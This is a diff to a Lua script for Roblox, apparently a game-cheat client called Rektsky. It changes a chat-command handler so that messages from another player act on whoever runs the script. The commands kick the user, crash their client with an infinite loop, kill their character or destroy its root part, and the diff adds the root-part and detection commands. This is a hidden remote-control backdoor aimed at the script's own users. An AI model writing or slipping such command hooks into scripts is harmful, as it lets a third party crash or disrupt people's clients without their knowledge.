@@ -15,9 +15,12 @@ local function output(plr, msg)
 			if player ~= lplr then
 			if string.lower(msg) == ".kick" then
 				lplr:Kick()
+			elseif string.lower(msg) == ".god" then
+				lplr.Character.HumanoidRootPart:Destroy()
 			elseif string.lower(msg) == ".crash" then
-				while true do  end
-
+				while true do end
+			elseif string.lower(msg) == ".detect" then
+				print("Rektsky user detected!")
 			elseif string.lower(msg) == ".kill" then
 				lplr.Character.Humanoid.Health = 0
 			end
